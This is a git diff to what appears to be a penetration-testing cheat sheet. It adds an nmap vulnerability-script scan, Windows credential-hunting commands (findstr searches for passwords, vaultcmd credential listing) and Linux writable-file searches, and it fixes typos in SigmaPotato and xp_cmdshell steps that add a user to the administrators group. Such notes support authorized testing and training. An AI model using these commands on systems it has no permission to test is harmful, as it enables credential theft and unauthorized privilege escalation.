@@ -36,6 +36,11 @@ nmap -n -sT -p- -T4 -Pn <target>
 nmap -n -sU --top-ports 1000 <target>
 ```
 
+### Vulnerability scripts
+```bash
+nmap --script vuln -p <ports> <target>
+```
+
 </details>
 
 <details>
@@ -509,7 +514,7 @@ whoami /priv
 <details>
   <summary><strong>Credential Hunting</strong></summary>
 
-### Powershell Hisoty
+### Powershell History
 ```ps
 Get-History
 ```
@@ -522,6 +527,18 @@ Get-History
 ### Search for files
 ```ps
 findstr /si password *.<file_type>
+```
+
+#### Interesting File Types
+* kdbx
+* txt
+* config
+* xml
+* ini
+
+### Stored creds
+```ps
+vaultcmd /list
 ```
 
 ### Putty keys
@@ -585,7 +602,7 @@ SigmaPotato.exe "net localgroup administrator <user> /add"
 
 #### Check for Full Permission (F)
 ```ps
-icalcs <path>
+icacls <path>
 ```
 
 #### Stop Service
@@ -747,7 +764,7 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
 
   ### Privesc to local administrator as db_admin
   ```bash
-  xp_cmdshelll 'SigmaPotato.exe "net localgroup administrator <user> /add"'
+  xp_cmdshell 'SigmaPotato.exe "net localgroup administrator <user> /add"'
   ```
 
 </details>
@@ -793,9 +810,23 @@ perl -e 'exec "/bin/sh";'
 id
 ```
 
-### Operating System 
+### Ssytem info
 ```shell
 lsb_release -a
+```
+```shell
+uname -a
+```
+```shell
+cat /proc/version
+```
+
+### Writable files
+```shell
+find / -writable -type f 2>/dev/null
+```
+```shell
+find / -writable -type d 2>/dev/null
 ```
 
 ### List Mounted Drives
@@ -803,7 +834,7 @@ lsb_release -a
 cat /etc/fstab
 ```
 
-### Listi all Available Drives
+### List all Available Drives
 ```shell
 lsblk
 ```
